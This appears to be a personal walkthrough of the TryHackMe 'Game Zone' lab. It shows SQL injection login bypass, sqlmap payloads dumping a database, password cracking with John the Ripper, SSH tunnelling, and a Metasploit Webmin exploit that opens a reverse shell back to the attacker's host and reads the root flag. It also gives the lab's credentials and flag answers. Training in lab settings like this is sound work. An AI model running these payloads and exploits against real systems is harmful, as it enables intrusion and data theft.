---
Learn to hack into this machine. Understand how to use SQLMap, crack some passwords, reveal services using a reverse SSH tunnel and escalate your privileges to root!
---

![|333](https://tryhackme-images.s3.amazonaws.com/room-icons/f840de8ced2851ef65e39bf9d809751e.jpeg)

![](https://i.imgur.com/aSCFaI4.png)

### Deploy the vulnerable machine 

This room will cover SQLi (exploiting this vulnerability manually and via SQLMap), cracking a users hashed password, using SSH tunnels to reveal a hidden service and using a metasploit payload to gain root privileges. 

```
┌──(kali㉿kali)-[~/Downloads/hackpark]
└─$ sudo nmap -sC -sV -T4 -A -Pn -sS -n -O 10.10.183.87 
[sudo] password for kali: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-27 16:51 EDT
Nmap scan report for 10.10.183.87
Host is up (0.19s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE    SERVICE    VERSION
22/tcp   open     ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 61:ea:89:f1:d4:a7:dc:a5:50:f7:6d:89:c3:af:0b:03 (RSA)
|   256 b3:7d:72:46:1e:d3:41:b6:6a:91:15:16:c9:4a:a5:fa (ECDSA)
|_  256 53:67:09:dc:ff:fb:3a:3e:fb:fe:cf:d8:6d:41:27:ab (ED25519)
80/tcp   open     http       Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Game Zone
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
1217/tcp filtered hpss-ndapi
8290/tcp filtered unknown
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=9/27%OT=22%CT=1%CU=34979%PV=Y%DS=2%DC=T%G=Y%TM=6333627
OS:C%P=x86_64-pc-linux-gnu)SEQ(SP=FE%GCD=1%ISR=FE%TI=Z%CI=I%II=I%TS=7)OPS(O
OS:1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11N
OS:W7%O6=M505ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R
OS:=Y%DF=Y%T=40%W=6903%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%
OS:RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y
OS:%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R
OS:%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=
OS:40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S
OS:)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1720/tcp)
HOP RTT       ADDRESS
1   185.43 ms 10.11.0.1
2   186.45 ms 10.10.183.87

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 46.54 seconds
zsh: segmentation fault  sudo nmap -sC -sV -T4 -A -Pn -sS -n -O 10.10.183.87

reverse img search /google img
agent 47




```


What is the name of the large cartoon avatar holding a sniper on the forum?
Reverse Image Search
*agent 47*

###  Obtain access via SQLi 


In this task you will understand more about SQL (structured query language) and how you can potentially manipulate queries to communicate with the database.



SQL is a standard language for storing, editing and retrieving data in databases. A query can look like so:

SELECT * FROM users WHERE username = :username AND password := password

In our GameZone machine, when you attempt to login, it will take your inputted values from your username and password, then insert them directly into the query above. If the query finds data, you'll be allowed to login otherwise it will display an error message.

Here is a potential place of vulnerability, as you can input your username as another SQL query. This will take the query write, place and execute it.





Lets use what we've learnt above, to manipulate the query and login without any legitimate credentials.

If we have our username as admin and our password as: ' or 1=1 -- - it will insert this into the query and authenticate our session.

The SQL query that now gets executed on the web server is as follows:

SELECT * FROM users WHERE username = admin AND password := ' or 1=1 -- -

	The extra SQL we inputted as our password has changed the above query to break the initial query and proceed (with the admin user) if 1==1, then comment the rest of the query to stop it breaking.




![[Pasted image 20220927173423.png]]


GameZone doesn't have an admin user in the database, however you can still login without knowing any credentials using the inputted password data we used in the previous question.

Use ' or 1=1 -- - as your username and leave the password blank.

When you've logged in, what page do you get redirected to?
*portal.php*


### Using SQLMap 

![](https://i.imgur.com/S3tNhsc.png)


SQLMap is a popular open-source, automatic SQL injection and database takeover tool. This comes pre-installed on all version of Kali Linux or can be manually downloaded and installed here.

There are many different types of SQL injection (boolean/time based, etc..) and SQLMap automates the whole process trying different techniques.



We're going to use SQLMap to dump the entire database for GameZone.

Using the page we logged into earlier, we're going point SQLMap to the game review search feature.

First we need to intercept a request made to the search feature using BurpSuite.



![](https://i.imgur.com/ox4wJVH.png)

Save this request into a text file. We can then pass this into SQLMap to use our authenticated user session.

![](https://i.imgur.com/W5boKpk.png)

-r uses the intercepted request you saved earlier
--dbms tells SQLMap what type of database management system it is
--dump attempts to outputs the entire database

![](https://i.imgur.com/iiQ7g9t.png)

SQLMap will now try different methods and identify the one thats vulnerable. Eventually, it will output the database.

![[Pasted image 20220927175132.png]]

```
┌──(kali㉿kali)-[~]
└─$ cat request.txt 
<?xml version="1.0"?>
<!DOCTYPE items [
<!ELEMENT items (item*)>
<!ATTLIST items burpVersion CDATA "">
<!ATTLIST items exportTime CDATA "">
<!ELEMENT item (time, url, host, port, protocol, method, path, extension, request, status, responselength, mimetype, response, comment)>
<!ELEMENT time (#PCDATA)>
<!ELEMENT url (#PCDATA)>
<!ELEMENT host (#PCDATA)>
<!ATTLIST host ip CDATA "">
<!ELEMENT port (#PCDATA)>
<!ELEMENT protocol (#PCDATA)>
<!ELEMENT method (#PCDATA)>
<!ELEMENT path (#PCDATA)>
<!ELEMENT extension (#PCDATA)>
<!ELEMENT request (#PCDATA)>
<!ATTLIST request base64 (true|false) "false">
<!ELEMENT status (#PCDATA)>
<!ELEMENT responselength (#PCDATA)>
<!ELEMENT mimetype (#PCDATA)>
<!ELEMENT response (#PCDATA)>
<!ATTLIST response base64 (true|false) "false">
<!ELEMENT comment (#PCDATA)>
]>
<items burpVersion="2022.8.4" exportTime="Tue Sep 27 18:52:40 EDT 2022">
  <item>
    <time>Tue Sep 27 18:50:31 EDT 2022</time>
    <url><![CDATA[http://10.10.78.58/portal.php]]></url>
    <host ip="10.10.78.58">10.10.78.58</host>
    <port>80</port>
    <protocol>http</protocol>
    <method><![CDATA[POST]]></method>
    <path><![CDATA[/portal.php]]></path>
    <extension>php</extension>
    <request base64="true"><![CDATA[UE9TVCAvcG9ydGFsLnBocCBIVFRQLzEuMQ0KSG9zdDogMTAuMTAuNzguNTgNClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NDsgcnY6MTAyLjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTAyLjANCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2UvYXZpZixpbWFnZS93ZWJwLCovKjtxPTAuOA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlDQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDE1DQpPcmlnaW46IGh0dHA6Ly8xMC4xMC43OC41OA0KQ29ubmVjdGlvbjogY2xvc2UNClJlZmVyZXI6IGh0dHA6Ly8xMC4xMC43OC41OC9wb3J0YWwucGhwDQpDb29raWU6IFBIUFNFU1NJRD0yOGl2am5kY2k3NDhuY2ZiNDg0dnJtbWloMA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KDQpzZWFyY2hpdGVtPXRlc3Q=]]></request>
    <status></status>
    <responselength></responselength>
    <mimetype></mimetype>
    <response base64="true"></response>
    <comment></comment>
  </item>
</items>

using sqlmap

┌──(kali㉿kali)-[~]
└─$ sqlmap -r request.txt --dbms=mysql --dump
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.6.9#stable}                                                                         
|_ -| . [,]     | .'| . |                                                                                        
|___|_  [.]_|_|_|__,|  _|                                                                                        
      |_|V...       |_|   https://sqlmap.org                                                                     

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:54:26 /2022-09-27/

[18:54:26] [INFO] parsing HTTP request from 'request.txt'
[18:54:27] [INFO] testing connection to the target URL
[18:54:27] [INFO] checking if the target is protected by some kind of WAF/IPS
[18:54:28] [INFO] testing if the target URL content is stable
[18:54:28] [INFO] target URL content is stable
[18:54:28] [INFO] testing if POST parameter 'searchitem' is dynamic
[18:54:28] [WARNING] POST parameter 'searchitem' does not appear to be dynamic
[18:54:29] [INFO] heuristic (basic) test shows that POST parameter 'searchitem' might be injectable (possible DBMS: 'MySQL')
[18:54:29] [INFO] heuristic (XSS) test shows that POST parameter 'searchitem' might be vulnerable to cross-site scripting (XSS) attacks
[18:54:29] [INFO] testing for SQL injection on POST parameter 'searchitem'
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[18:54:59] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[18:55:00] [WARNING] reflective value(s) found and filtering out
[18:55:02] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[18:55:03] [INFO] testing 'Generic inline queries'
[18:55:03] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[18:55:15] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[18:55:17] [INFO] POST parameter 'searchitem' appears to be 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)' injectable (with --string="11")                                                                     
[18:55:17] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'                                                                                                           
[18:55:17] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[18:55:18] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[18:55:18] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[18:55:18] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'                                                                                                               
[18:55:19] [INFO] POST parameter 'searchitem' is 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)' injectable                                                                             
[18:55:19] [INFO] testing 'MySQL inline queries'
[18:55:19] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[18:55:19] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[18:55:20] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[18:55:20] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[18:55:20] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[18:55:20] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[18:55:21] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[18:55:31] [INFO] POST parameter 'searchitem' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[18:55:31] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[18:55:31] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[18:55:31] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[18:55:32] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[18:55:33] [INFO] target URL appears to have 3 columns in query
[18:55:33] [INFO] POST parameter 'searchitem' is 'MySQL UNION query (NULL) - 1 to 20 columns' injectable
[18:55:33] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
POST parameter 'searchitem' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 88 HTTP(s) requests:
---
Parameter: searchitem (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: searchitem=-3544' OR 8031=8031#

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: searchitem=test' AND GTID_SUBSET(CONCAT(0x7176766a71,(SELECT (ELT(8571=8571,1))),0x717a786b71),8571)-- wqyO

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: searchitem=test' AND (SELECT 1294 FROM (SELECT(SLEEP(5)))ACOK)-- rmzs

    Type: UNION query
    Title: MySQL UNION query (NULL) - 3 columns
    Payload: searchitem=test' UNION ALL SELECT NULL,NULL,CONCAT(0x7176766a71,0x716f634359684653755875704c75565176724b714d4767444962514d7a75524859676c424557566e,0x717a786b71)#
---
[18:56:59] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 16.10 or 16.04 (xenial or yakkety)
web application technology: Apache 2.4.18
back-end DBMS: MySQL >= 5.6
[18:57:01] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[18:57:01] [INFO] fetching current database
[18:57:01] [INFO] fetching tables for database: 'db'
[18:57:02] [INFO] fetching columns for table 'users' in database 'db'
[18:57:02] [INFO] fetching entries for table 'users' in database 'db'
[18:57:02] [INFO] recognized possible password hashes in column 'pwd'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] N
do you want to crack them via a dictionary-based attack? [Y/n/q] Y
[18:57:08] [INFO] using hash method 'sha256_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
> 1
[18:57:39] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] N
[18:57:43] [INFO] starting dictionary-based cracking (sha256_generic_passwd)
[18:57:43] [INFO] starting 4 processes 
[18:58:08] [WARNING] no clear password(s) found                                                                 
Database: db
Table: users
[1 entry]
+------------------------------------------------------------------+----------+
| pwd                                                              | username |
+------------------------------------------------------------------+----------+
| ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14 | agent47  |
+------------------------------------------------------------------+----------+

[18:58:08] [INFO] table 'db.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/10.10.78.58/dump/db/users.csv'                                                                                                       
[18:58:08] [INFO] fetching columns for table 'post' in database 'db'
[18:58:09] [INFO] fetching entries for table 'post' in database 'db'
Database: db
Table: post
[5 entries]
+----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| id | name                           | description                                                                                                                                                                                            |
+----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| 1  | Mortal Kombat 11               | Its a rare fighting game that hits just about every note as strongly as Mortal Kombat 11 does. Everything from its methodical and deep combat.                                                         |
| 2  | Marvel Ultimate Alliance 3     | Switch owners will find plenty of content to chew through, particularly with friends, and while it may be the gaming equivalent to a Hulk Smash, that isnt to say that it isnt a rollicking good time. |
| 3  | SWBF2 2005                     | Best game ever                                                                                                                                                                                         |
| 4  | Hitman 2                       | Hitman 2 doesnt add much of note to the structure of its predecessor and thus feels more like Hitman 1.5 than a full-blown sequel. But thats not a bad thing.                                          |
| 5  | Call of Duty: Modern Warfare 2 | When you look at the total package, Call of Duty: Modern Warfare 2 is hands-down one of the best first-person shooters out there, and a truly amazing offering across any system.                      |
+----+--------------------------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+

[18:58:09] [INFO] table 'db.post' dumped to CSV file '/home/kali/.local/share/sqlmap/output/10.10.78.58/dump/db/post.csv'                                                                                                         
[18:58:09] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.10.78.58'

[*] ending @ 18:58:09 /2022-09-27/



```


In the users table, what is the hashed password?
*ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14*

What was the username associated with the hashed password?
*agent47*

What was the other table name?
*post*

### Cracking a password with JohnTheRipper 

![](https://i.imgur.com/QDFpEaJ.png)

John the Ripper (JTR) is a fast, free and open-source password cracker. This is also pre-installed on all Kali Linux machines.

We will use this program to crack the hash we obtained earlier. JohnTheRipper is 15 years old and other programs such as HashCat are one of several other cracking programs out there. 

This program works by taking a wordlist, hashing it with the specified algorithm and then comparing it to your hashed password. If both hashed passwords are the same, it means it has found it. You cannot reverse a hash, so it needs to be done by comparing hashes.

Once you have JohnTheRipper installed you can run it against your hash using the following arguments:

![](https://i.imgur.com/64g6Y8F.png)

hash.txt - contains a list of your hashes (in your case its just 1 hash)
--wordlist - is the wordlist you're using to find the dehashed value
--format - is the hashing algorithm used. In our case its hashed using SHA256.

```
┌──(kali㉿kali)-[~]
└─$ echo 'ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14' > agent.hash 
                                                                                                                 
┌──(kali㉿kali)-[~]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt agent.hash -format=Raw-SHA256 
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA256 [SHA256 128/128 AVX 4x])
Warning: poor OpenMP scalability for this hash type, consider --fork=4
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
videogamer124    (?)     
1g 0:00:00:00 DONE (2022-09-27 19:01) 1.886g/s 5502Kp/s 5502Kc/s 5502KC/s vimivi..veluca
Use the "--show --format=Raw-SHA256" options to display all of the cracked passwords reliably
Session completed. 

┌──(kali㉿kali)-[~]
└─$ ssh agent47@10.10.78.58                  
The authenticity of host '10.10.78.58 (10.10.78.58)' can't be established.
ED25519 key fingerprint is SHA256:CyJgMM67uFKDbNbKyUM0DexcI+LWun63SGLfBvqQcLA.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.78.58' (ED25519) to the list of known hosts.
agent47@10.10.78.58's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

109 packages can be updated.
68 updates are security updates.


Last login: Fri Aug 16 17:52:04 2019 from 192.168.1.147
agent47@gamezone:~$ ls
user.txt
agent47@gamezone:~$ cat user.txt
649ac17b1480ac13ef1e4fa579dac95c


```

What is the de-hashed password?
*videogamer124*

Now you have a password and username. Try SSH'ing onto the machine.

What is the user flag?
*649ac17b1480ac13ef1e4fa579dac95c*


### Exposing services with reverse SSH tunnels 

![](https://i.imgur.com/cYZsC8p.png)

Reverse SSH port forwarding specifies that the given port on the remote server host is to be forwarded to the given host and port on the local side.

-L is a local tunnel (YOU <-- CLIENT). If a site was blocked, you can forward the traffic to a server you own and view it. For example, if imgur was blocked at work, you can do ssh -L 9000:imgur.com:80 user@example.com. Going to localhost:9000 on your machine, will load imgur traffic using your other server.

-R is a remote tunnel (YOU --> CLIENT). You forward your traffic to the other server for others to view. Similar to the example above, but in reverse.



We will use a tool called ss to investigate sockets running on a host.

If we run ss -tulpn it will tell us what socket connections are running
Argument	Description
-t	Display TCP sockets
-u	Display UDP sockets
-l	Displays only listening sockets
-p	Shows the process using the socket
-n	Doesn't resolve service names

```
agent47@gamezone:~$ ss -tulpn
Netid State      Recv-Q Send-Q         Local Address:Port                        Peer Address:Port              
udp   UNCONN     0      0                          *:68                                     *:*                  
udp   UNCONN     0      0                          *:10000                                  *:*                  
tcp   LISTEN     0      128                        *:22                                     *:*                  
tcp   LISTEN     0      80                 127.0.0.1:3306                                   *:*                  
tcp   LISTEN     0      128                        *:10000                                  *:*                  
tcp   LISTEN     0      128                       :::22                                    :::*                  
tcp   LISTEN     0      128                       :::80                                    :::*     

or

agent47@gamezone:~$ netstat -utan
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:10000           0.0.0.0:*               LISTEN     
tcp        0    316 10.10.78.58:22          10.11.81.220:50090      ESTABLISHED
tcp6       0      0 :::22                   :::*                    LISTEN     
tcp6       0      0 :::80                   :::*                    LISTEN     
udp        0      0 0.0.0.0:68              0.0.0.0:*                          
udp        0      0 0.0.0.0:10000           0.0.0.0:*                          

```


How many TCP sockets are running?
*5*



We can see that a service running on port 10000 is blocked via a firewall rule from the outside (we can see this from the IPtable list). However, Using an SSH Tunnel we can expose the port to us (locally)!

	From our local machine, run ssh -L 10000:localhost:10000 <username>@<ip>

Once complete, in your browser type "localhost:10000" and you can access the newly-exposed webserver.

![](https://i.imgur.com/9vJZUZv.png)

```
tunnel ssh

──(kali㉿kali)-[~/Downloads/hackpark]
└─$ ssh -L 10000:127.0.0.1:10000 agent47@10.10.78.58
agent47@10.10.78.58's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

109 packages can be updated.
68 updates are security updates.


Last login: Tue Sep 27 18:03:14 2022 from 10.11.81.220
agent47@gamezone:~$

http://127.0.0.1:10000/


```

![[Pasted image 20220927180757.png]]

What is the name of the exposed CMS?
*Webmin*

```
┌──(kali㉿kali)-[~]
└─$ nmap -sV -p 10000 127.0.0.1
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-27 19:08 EDT
Nmap scan report for localhost (127.0.0.1)
Host is up (0.0028s latency).

PORT      STATE SERVICE VERSION
10000/tcp open  http    MiniServ 1.580 (Webmin httpd)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.11 seconds
zsh: segmentation fault  nmap -sV -p 10000 127.0.0.1

using

agent47:videogamer124

Webmin version 	1.580
```
What is the CMS version?
*1.580*
Any credentials you can make use of to login?



### Privilege Escalation with Metasploit 

Using the CMS dashboard version, use Metasploit to find a payload to execute against the machine.

```
┌──(kali㉿kali)-[~]
└─$ msfconsole -q
msf6 > search webmin

Matching Modules
================

   #  Name                                           Disclosure Date  Rank       Check  Description
   -  ----                                           ---------------  ----       -----  -----------
   0  exploit/unix/webapp/webmin_show_cgi_exec       2012-09-06       excellent  Yes    Webmin /file/show.cgi Remote Command Execution
   1  auxiliary/admin/webmin/file_disclosure         2006-06-30       normal     No     Webmin File Disclosure
   2  exploit/linux/http/webmin_package_updates_rce  2022-07-26       excellent  Yes    Webmin Package Updates RCE
   3  exploit/linux/http/webmin_packageup_rce        2019-05-16       excellent  Yes    Webmin Package Updates Remote Command Execution
   4  exploit/unix/webapp/webmin_upload_exec         2019-01-17       excellent  Yes    Webmin Upload Authenticated RCE
   5  auxiliary/admin/webmin/edit_html_fileaccess    2012-09-06       normal     No     Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access
   6  exploit/linux/http/webmin_backdoor             2019-08-10       excellent  Yes    Webmin password_change.cgi Backdoor


Interact with a module by name or index. For example info 6, use 6 or use exploit/linux/http/webmin_backdoor

msf6 > use 0
msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set payload cmd/unix/reverse
payload => cmd/unix/reverse
msf6 exploit(unix/webapp/webmin_show_cgi_exec) > show options

Module options (exploit/unix/webapp/webmin_show_cgi_exec):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD                   yes       Webmin Password
   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                     yes       The target host(s), see https://github.com/rapid7/metasploit-framework/
                                        wiki/Using-Metasploit
   RPORT     10000            yes       The target port (TCP)
   SSL       true             yes       Use SSL
   USERNAME                   yes       Webmin Username
   VHOST                      no        HTTP server virtual host


Payload options (cmd/unix/reverse):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Webmin 1.580


msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set rhosts 127.0.0.1
rhosts => 127.0.0.1
msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set ssl false
[!] Changing the SSL option's value may require changing RPORT!
ssl => false
msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set rport 10000
rport => 10000
msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set username agent47
username => agent47
msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set password videogamer124
password => videogamer124
msf6 exploit(unix/webapp/webmin_show_cgi_exec) > set lhost 10.11.81.220
lhost => 10.11.81.220
msf6 exploit(unix/webapp/webmin_show_cgi_exec) > exploit

[*] Started reverse TCP double handler on 10.11.81.220:4444 
[*] Attempting to login...
[+] Authentication successful
[+] Authentication successful
[*] Attempting to execute the payload...
[+] Payload executed successfully
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo mSRvPkBQ15f35DS7;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket A
[*] A: "mSRvPkBQ15f35DS7\r\n"
[*] Matching...
[*] B is input...
[*] Command shell session 1 opened (10.11.81.220:4444 -> 10.10.78.58:57722) at 2022-09-27 19:15:44 -0400

pwd
/usr/share/webmin/file/
whoami
root
cat /root/root.txt
a4b945830144bdd71908d12d902adeee
```


What is the root flag?

The correct payload will also give you root access. Flag located at /root/root.txt

*a4b945830144bdd71908d12d902adeee*

[[HackPark]]